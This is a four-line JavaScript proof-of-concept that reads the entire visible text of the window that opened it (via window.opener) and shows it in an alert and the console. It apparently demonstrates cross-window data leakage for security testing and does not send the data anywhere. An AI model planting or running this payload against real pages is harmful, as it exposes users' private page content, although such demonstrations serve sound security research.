alert("leaked")
var leakedData = window.opener.document.documentElement.innerText
console.log(leakedData)
alert(leakedData)



